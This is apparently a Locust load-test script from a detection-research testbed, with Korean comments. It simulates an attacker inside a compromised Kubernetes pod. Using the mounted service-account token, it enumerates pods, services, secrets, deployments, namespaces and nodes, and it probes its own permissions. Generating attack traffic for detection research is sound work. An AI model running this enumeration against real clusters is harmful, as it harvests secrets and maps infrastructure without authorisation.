# k8s_enum_locustfile.py — 시나리오 1: 클러스터 정보 열거 (T1589, T1528, T1613)
#
# 전제: 공격자가 이미 pod 내부 접근권한을 확보(= 침해된 컨테이너).
#       pod에 자동 마운트되는 서비스어카운트 토큰(T1528)으로 K8s API 서버를 조회해
#       파드/서비스/시크릿/네트워크정책 등 클러스터 리소스를 열거한다(T1613).
# 성격: 전부 read-only GET. 논문 attack pcap의 API 서버(10.96.0.1:443) egress와 동일 계열.
# 실행: 반드시 클러스터 '안'의 pod(attacker)에서 실행해야 토큰·API 접근이 된다(run.sh attack).
#
# ■ confound 정렬 안 함(의도): 대상이 K8s API 서버라 benign 등가물이 없다 → 침해 도구의 지문·pacing이
#   앱과 다른 것이 오히려 현실적. (benign 과 같은 엔드포인트를 때리는 bruteforce 만 정렬한다.)
# ■ standalone: attacker pod 는 configmap(/mnt)에 attack 파일만 마운트되므로 common.harness 를 쓰지 않는다.
# ■ 규모: 시각화(분포 분리 확인)를 위해 논문 최소치(~84패킷)보다 넉넉히 수집 — run.sh 에서 -u/-t 로 조정.

import os
from locust import HttpUser, task, between

SA = "/var/run/secrets/kubernetes.io/serviceaccount"


def _read(path, default=""):
    try:
        with open(path) as f:
            return f.read().strip()
    except Exception:
        return default


TOKEN = _read(f"{SA}/token")
CACERT = f"{SA}/ca.crt"
NS = os.environ.get("TARGET_NS", _read(f"{SA}/namespace", "deepmesh"))


class K8sEnumUser(HttpUser):
    # 인클러스터 API 서버(기본). 노드/외부에서 돌리면 토큰이 없어 401/403만 난다.
    host = os.environ.get("HOST", "https://kubernetes.default.svc")
    wait_time = between(0.5, 3.0)

    def on_start(self):
        self.client.verify = CACERT if os.path.exists(CACERT) else False
        if TOKEN:
            self.client.headers.update({"Authorization": f"Bearer {TOKEN}"})

    # --- T1613: 클러스터 리소스 열거 (권한 없으면 403 — 시도 자체가 공격) ---
    @task(3)
    def list_pods(self):
        self.client.get(f"/api/v1/namespaces/{NS}/pods", name="GET /pods")

    @task(2)
    def list_services(self):
        self.client.get(f"/api/v1/namespaces/{NS}/services", name="GET /services")

    @task(2)
    def list_secrets(self):
        # 시크릿 열거 = 자격증명 수집 시도
        self.client.get(f"/api/v1/namespaces/{NS}/secrets", name="GET /secrets")

    @task(1)
    def list_deployments(self):
        self.client.get(f"/apis/apps/v1/namespaces/{NS}/deployments", name="GET /deployments")

    @task(1)
    def list_networkpolicies(self):
        self.client.get(f"/apis/networking.k8s.io/v1/namespaces/{NS}/networkpolicies",
                        name="GET /networkpolicies")

    @task(1)
    def list_namespaces(self):
        self.client.get("/api/v1/namespaces", name="GET /namespaces")

    @task(1)
    def list_nodes(self):
        self.client.get("/api/v1/nodes", name="GET /nodes")

    @task(1)
    def self_review(self):
        # 내 SA가 무슨 권한을 갖는지 정찰 (SelfSubjectRulesReview)
        body = {"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
                "spec": {"namespace": NS}}
        import json
        self.client.post("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
                         data=json.dumps(body),
                         headers={"Content-Type": "application/json"},
                         name="POST /selfsubjectrulesreview")
